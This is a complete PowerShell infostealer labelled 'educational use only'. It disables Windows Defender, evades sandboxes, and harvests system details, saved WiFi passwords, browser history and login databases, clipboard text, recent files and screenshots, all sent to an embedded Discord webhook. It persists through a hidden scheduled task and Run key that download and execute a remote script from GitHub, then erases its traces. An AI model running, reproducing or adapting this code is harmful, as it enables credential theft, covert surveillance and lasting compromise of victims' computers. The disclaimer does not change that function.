# ================================================================
# ADVANCED DATA EXFILTRATION PAYLOAD - EDUCATIONAL USE ONLY
# ================================================================
# WARNING: This is for testing on YOUR OWN systems only!
# Unauthorized use is illegal under computer fraud laws.
# ================================================================

# Configuration
$webhookUrl = "https://discord.com/api/webhooks/1438102665900068966/IW_cUGLJMcqk9A8vHVlW-ELAjSSddZjFWJgmOKaVZgyHzO1QQPSiwUCmINI10blwstec"
$delayBetweenMessages = 2  # Seconds to wait between Discord messages

# ================================================================
# EVASION: Disable Windows Defender (Requires Admin)
# ================================================================
function Disable-Defender {
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        return "‚úÖ Defender disabled"
    }
    catch {
        return "‚ùå Defender disable failed (no admin rights)"
    }
}

# ================================================================
# EVASION: Check for VM/Sandbox (IMPROVED)
# ================================================================
function Test-Sandbox {
    $score = 0
    $indicators = @()
    
    # Check for VM artifacts
    $vm = Get-WmiObject Win32_ComputerSystem
    if ($vm.Manufacturer -match "VMware|VirtualBox|Xen|QEMU|Microsoft Corporation") {
        $score += 3
        $indicators += "VM Manufacturer: $($vm.Manufacturer)"
    }
    
    # Check for very low RAM (sandboxes typically have <2GB)
    $ramGB = [math]::Round($vm.TotalPhysicalMemory/1GB,2)
    if ($ramGB -lt 2) {
        $score += 2
        $indicators += "Suspicious RAM: ${ramGB}GB"
    }
    
    # Check for specific sandbox/analysis processes (more specific)
    $suspiciousProcs = @('vboxservice', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'vmwareuser', 
                         'vmsrvc', 'vmusrvc', 'prl_tools', 'prl_cc', 'xenservice', 
                         'qemu-ga', 'wireshark', 'fiddler', 'processhacker', 'procmon')
    
    $foundProcs = Get-Process | Where-Object {
        $procName = $_.Name.ToLower()
        $suspiciousProcs -contains $procName
    }
    
    if ($foundProcs) {
        $score += 2
        $indicators += "Sandbox processes: $($foundProcs.Name -join ', ')"
    }
    
    # Check for known sandbox usernames
    if ($env:USERNAME -match "sandbox|malware|virus|test|analyst") {
        $score += 2
        $indicators += "Suspicious username: $env:USERNAME"
    }
    
    # Only abort if score is 4+ (multiple indicators)
    return @{
        IsSandbox = ($score -ge 4)
        Score = $score
        Indicators = $indicators
    }
}

# ================================================================
# DATA COLLECTION: System Information
# ================================================================
function Get-SystemInfo {
    $os = Get-WmiObject Win32_OperatingSystem
    $cs = Get-WmiObject Win32_ComputerSystem
    $bios = Get-WmiObject Win32_BIOS
    
    $info = @"
**üñ•Ô∏è SYSTEM INFORMATION**
\`\`\`
Computer Name: $env:COMPUTERNAME
Username: $env:USERNAME
Full Name: $(([Security.Principal.WindowsIdentity]::GetCurrent()).Name)
OS: $($os.Caption) $($os.OSArchitecture)
Build: $($os.BuildNumber)
Install Date: $($os.InstallDate)
Boot Time: $($os.LastBootUpTime)
Uptime: $((Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime))
Manufacturer: $($cs.Manufacturer)
Model: $($cs.Model)
Serial: $($bios.SerialNumber)
RAM: $([math]::Round($cs.TotalPhysicalMemory/1GB,2))GB
Processor: $env:PROCESSOR_IDENTIFIER
Domain: $($cs.Domain)
Time Zone: $(Get-TimeZone).DisplayName
Current Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
\`\`\`
"@
    return $info
}

# ================================================================
# DATA COLLECTION: Network Information
# ================================================================
function Get-NetworkInfo {
    $info = "**üåê NETWORK INFORMATION**`n``````"
    
    # IP Addresses
    $adapters = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
        $_.InterfaceAlias -notlike '*Loopback*'
    }
    $info += "`nIP Addresses:"
    foreach ($adapter in $adapters) {
        $info += "`n  $($adapter.InterfaceAlias): $($adapter.IPAddress)"
    }
    
    # MAC Addresses
    $macs = Get-NetAdapter | Where-Object Status -eq 'Up'
    $info += "`n`nMAC Addresses:"
    foreach ($mac in $macs) {
        $info += "`n  $($mac.Name): $($mac.MacAddress)"
    }
    
    # Public IP
    try {
        $publicIP = (Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 5).ip
        $info += "`n`nPublic IP: $publicIP"
    }
    catch {
        $info += "`n`nPublic IP: Could not retrieve"
    }
    
    $info += "``````"
    return $info
}

# ================================================================
# DATA COLLECTION: WiFi Passwords
# ================================================================
function Get-WiFiPasswords {
    $info = "**üîë SAVED WIFI PASSWORDS**`n``````"
    
    try {
        $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[-1].Trim()
        }
        
        $count = 0
        foreach ($profile in $profiles) {
            $passInfo = netsh wlan show profile name="$profile" key=clear
            $password = ($passInfo | Select-String "Key Content") -replace ".*: ", ""
            
            if ($password) {
                $info += "`nNetwork: $profile"
                $info += "`nPassword: $password`n"
                $count++
            }
        }
        
        if ($count -eq 0) {
            $info += "`nNo saved WiFi networks found"
        }
    }
    catch {
        $info += "`nFailed to retrieve WiFi passwords"
    }
    
    $info += "``````"
    return $info
}

# ================================================================
# DATA COLLECTION: Browser Data
# ================================================================
function Get-BrowserData {
    $info = "**üåê BROWSER DATA**`n``````"
    
    # Chrome/Edge History
    $browsers = @(
        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"},
        @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"}
    )
    
    foreach ($browser in $browsers) {
        $histPath = Join-Path $browser.Path "History"
        $loginPath = Join-Path $browser.Path "Login Data"
        
        if (Test-Path $histPath) {
            try {
                $tempHist = "$env:TEMP\$($browser.Name)_hist_$(Get-Random).db"
                Copy-Item $histPath $tempHist -ErrorAction Stop
                $info += "`n$($browser.Name) History: ‚úÖ Captured"
            }
            catch {
                $info += "`n$($browser.Name) History: ‚ùå Locked (browser open)"
            }
        }
        
        if (Test-Path $loginPath) {
            try {
                $tempLogin = "$env:TEMP\$($browser.Name)_login_$(Get-Random).db"
                Copy-Item $loginPath $tempLogin -ErrorAction Stop
                $info += "`n$($browser.Name) Passwords: ‚úÖ Captured"
            }
            catch {
                $info += "`n$($browser.Name) Passwords: ‚ùå Locked"
            }
        }
    }
    
    # Firefox
    $ffProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $ffProfiles) {
        Get-ChildItem $ffProfiles -Directory | ForEach-Object {
            $places = Join-Path $_.FullName "places.sqlite"
            if (Test-Path $places) {
                try {
                    $tempPlaces = "$env:TEMP\ff_places_$(Get-Random).db"
                    Copy-Item $places $tempPlaces -ErrorAction Stop
                    $info += "`nFirefox History: ‚úÖ Captured"
                }
                catch {
                    $info += "`nFirefox History: ‚ùå Locked"
                }
            }
        }
    }
    
    $info += "``````"
    return $info
}

# ================================================================
# DATA COLLECTION: Clipboard
# ================================================================
function Get-ClipboardData {
    $info = "**üìã CLIPBOARD**`n``````"
    
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $clip = [System.Windows.Forms.Clipboard]::GetText()
        
        if ($clip -and $clip.Length -gt 0) {
            if ($clip.Length -gt 500) {
                $clip = $clip.Substring(0, 500) + "... (truncated)"
            }
            $info += "`n$clip"
        }
        else {
            $info += "`n(Empty)"
        }
    }
    catch {
        $info += "`nFailed to retrieve"
    }
    
    $info += "``````"
    return $info
}

# ================================================================
# DATA COLLECTION: Recent Files
# ================================================================
function Get-RecentFiles {
    $info = "**üìÅ RECENT FILES (Last 15)**`n``````"
    
    try {
        $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -File |
            Sort-Object LastWriteTime -Descending |
            Select-Object -First 15
        
        foreach ($file in $recent) {
            $info += "`n[$($file.LastWriteTime.ToString('MM/dd HH:mm'))] $($file.Name)"
        }
    }
    catch {
        $info += "`nFailed to retrieve recent files"
    }
    
    $info += "``````"
    return $info
}

# ================================================================
# DATA COLLECTION: Screenshot
# ================================================================
function Get-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        
        $tempPath = "$env:TEMP\sc_$(Get-Random).png"
        $bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)
        
        $graphics.Dispose()
        $bitmap.Dispose()
        
        return $tempPath
    }
    catch {
        return $null
    }
}

# ================================================================
# PERSISTENCE: Create Scheduled Task
# ================================================================
function Install-Persistence {
    $info = "**üîÑ PERSISTENCE**`n``````"
    
    try {
        $taskName = "WindowsUpdateCheck"
        $scriptUrl = "https://raw.githubusercontent.com/SaturnJZX/Security-test/refs/heads/main/payload.ps1"
        
        # Create PowerShell command that downloads and executes
        $psCommand = "iex(iwr '$scriptUrl' -UseBasicParsing).Content"
        
        # Create scheduled task
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$psCommand`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 10)
        
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
        
        $info += "`n‚úÖ Scheduled Task: $taskName"
        $info += "`n‚úÖ Trigger: At user logon"
        $info += "`n‚úÖ Action: Download and execute from GitHub"
    }
    catch {
        $info += "`n‚ùå Failed (may need admin rights)"
    }
    
    # Registry Run key (backup method)
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex(iwr 'https://raw.githubusercontent.com/SaturnJZX/Security-test/refs/heads/main/payload.ps1' -UseBasicParsing).Content`""
        Set-ItemProperty -Path $regPath -Name "WindowsUpdateCheck" -Value $psCommand -ErrorAction Stop
        $info += "`n‚úÖ Registry Run Key: Created"
    }
    catch {
        $info += "`n‚ùå Registry: Failed"
    }
    
    $info += "``````"
    return $info
}

# ================================================================
# DISCORD UPLOAD FUNCTION
# ================================================================
function Send-ToDiscord {
    param(
        [string]$Message,
        [string]$FilePath
    )
    
    try {
        if ($FilePath -and (Test-Path $FilePath)) {
            $fileName = Split-Path $FilePath -Leaf
            $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
            $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
            
            $boundary = [System.Guid]::NewGuid().ToString()
            $LF = "`r`n"
            
            $bodyLines = (
                "--$boundary",
                "Content-Disposition: form-data; name=`"content`"$LF",
                $Message,
                "--$boundary",
                "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
                "Content-Type: application/octet-stream$LF",
                $fileEnc,
                "--$boundary--$LF"
            ) -join $LF
            
            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines | Out-Null
        }
        else {
            $payload = @{ content = $Message } | ConvertTo-Json
            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payload | Out-Null
        }
        
        return $true
    }
    catch {
        Write-Host "Discord send failed: $_"
        return $false
    }
}

# ================================================================
# CLEANUP FUNCTION
# ================================================================
function Clear-Traces {
    try {
        # Clear PowerShell history
        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
        
        # Clear Run dialog history
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
        
        # Clear temp files created by this script
        Get-ChildItem $env:TEMP | Where-Object {
            $_.Name -like "*hist_*" -or $_.Name -like "*login_*" -or $_.Name -like "*sc_*" -or $_.Name -like "*places_*"
        } | Remove-Item -Force -ErrorAction SilentlyContinue
        
        return "**‚úÖ CLEANUP COMPLETE**`n``````Traces cleared successfully``````"
    }
    catch {
        return "**‚ö†Ô∏è CLEANUP**`n``````Some traces may remain``````"
    }
}

# ================================================================
# MAIN EXECUTION
# ================================================================

# Check for sandbox/VM (improved detection)
$sandboxCheck = Test-Sandbox
if ($sandboxCheck.IsSandbox) {
    $msg = "‚ö†Ô∏è **SANDBOX DETECTED - ABORTING**`n``````Score: $($sandboxCheck.Score)/10`n$($sandboxCheck.Indicators -join "`n")``````"
    Send-ToDiscord -Message $msg
    exit
}

# Send initial notification
Send-ToDiscord -Message "üéØ **NEW INFECTION DETECTED** üéØ`n*Beginning data collection...*"
Start-Sleep -Seconds $delayBetweenMessages

# Attempt to disable Defender
$defenderStatus = Disable-Defender

# Collect and send system info
$sysInfo = Get-SystemInfo
Send-ToDiscord -Message $sysInfo
Start-Sleep -Seconds $delayBetweenMessages

# Collect and send network info
$netInfo = Get-NetworkInfo
Send-ToDiscord -Message $netInfo
Start-Sleep -Seconds $delayBetweenMessages

# Collect and send WiFi passwords
$wifiInfo = Get-WiFiPasswords
Send-ToDiscord -Message $wifiInfo
Start-Sleep -Seconds $delayBetweenMessages

# Collect and send browser data
$browserInfo = Get-BrowserData
Send-ToDiscord -Message $browserInfo
Start-Sleep -Seconds $delayBetweenMessages

# Collect and send clipboard
$clipInfo = Get-ClipboardData
Send-ToDiscord -Message $clipInfo
Start-Sleep -Seconds $delayBetweenMessages

# Collect and send recent files
$recentInfo = Get-RecentFiles
Send-ToDiscord -Message $recentInfo
Start-Sleep -Seconds $delayBetweenMessages

# Install persistence
$persistInfo = Install-Persistence
Send-ToDiscord -Message $persistInfo
Start-Sleep -Seconds $delayBetweenMessages

# Send Defender status
Send-ToDiscord -Message "**üõ°Ô∏è DEFENDER STATUS**`n``````$defenderStatus``````"
Start-Sleep -Seconds $delayBetweenMessages

# Take and send screenshot
$screenshot = Get-Screenshot
if ($screenshot) {
    Send-ToDiscord -Message "üì∏ **Screenshot captured**" -FilePath $screenshot
    Remove-Item $screenshot -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds $delayBetweenMessages
}

# Cleanup traces
$cleanupStatus = Clear-Traces
Send-ToDiscord -Message $cleanupStatus
Start-Sleep -Seconds $delayBetweenMessages

# Final message
Send-ToDiscord -Message "‚úÖ **EXFILTRATION COMPLETE**`n*Persistence installed - will execute again at next logon*"
